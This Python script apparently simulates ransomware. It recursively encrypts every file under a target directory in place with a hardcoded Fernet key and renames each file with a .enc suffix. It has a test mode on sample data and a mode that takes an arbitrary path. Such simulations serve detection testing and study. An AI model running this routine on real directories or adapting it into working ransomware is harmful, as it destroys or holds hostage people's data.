import shutil
import os
import sys
from cryptography.fernet import Fernet

'''
This program will copy "sampledata" to the "~/encryption-test/sampledata", recursively encrypt all files in the "sampledata" directory, and delete the original "sampledata" directory.
'''

THIS_DIR = os.path.dirname(os.path.abspath(__file__))

SAMPLE_DATA_DEST_PATH = os.path.expanduser("~/encryption-test/sampledata")

ENCRYPTION_KEY_RAW = b"acS7-XGrwdwu7Kfx1swNCsT6XMYvcv5BKAonky8MkEo="
FERNET = Fernet(ENCRYPTION_KEY_RAW)


def encrypt_file(
        file_path: str,
        appender=lambda fh: (None)
) -> str:
    data_encrypted = None

    # read file contents, encrypt data in memory
    with open(file_path, 'rb') as f:
        data: bytes = f.read()

        data_encrypted = FERNET.encrypt(data)

    # write encrypted data to file
    with open(file_path, 'wb') as f:
        f.write(data_encrypted)

        # append data to file if we want to
        appender(f)

    # rename file
    file_path_enc: str = file_path + ".enc"
    shutil.move(file_path, file_path_enc)

    print("MV " + file_path + " " + file_path_enc)

    return file_path_enc


def copy_sampledata_to_dest():
    shutil.copytree(os.path.abspath(THIS_DIR + "/sampledata"), SAMPLE_DATA_DEST_PATH)


def delete_sampledata_from_dest():
    shutil.rmtree(SAMPLE_DATA_DEST_PATH)


def encrypt_folder_recursively(folder_path) -> None:
    # walk tree recursively
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)

            if file_path.endswith(".enc"):
                # don't encrypt, it's already encrypted
                print("SKIP " + file_path)
                continue

            print("ENCRYPT " + file_path)
            encrypt_file(file_path)


if __name__ == "__main__":

    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument("--test", action='store_true')
    parser.add_argument("--encryptpath")
    args = parser.parse_args()

    if args.test:
        if os.path.exists(SAMPLE_DATA_DEST_PATH):
            delete_sampledata_from_dest()

        if not os.path.exists(SAMPLE_DATA_DEST_PATH):
            copy_sampledata_to_dest()

        encrypt_folder_recursively(SAMPLE_DATA_DEST_PATH)
        exit(0)

    if args.encryptpath:
        encrypt_path = args.encryptpath
        encrypt_path = os.path.abspath(encrypt_path)

        print("Going to recursively encrypt "+encrypt_path)
        print("CTRL-C to cancel! (waiting 5 seconds)")
        import time
        time.sleep(5)

        encrypt_folder_recursively(encrypt_path)
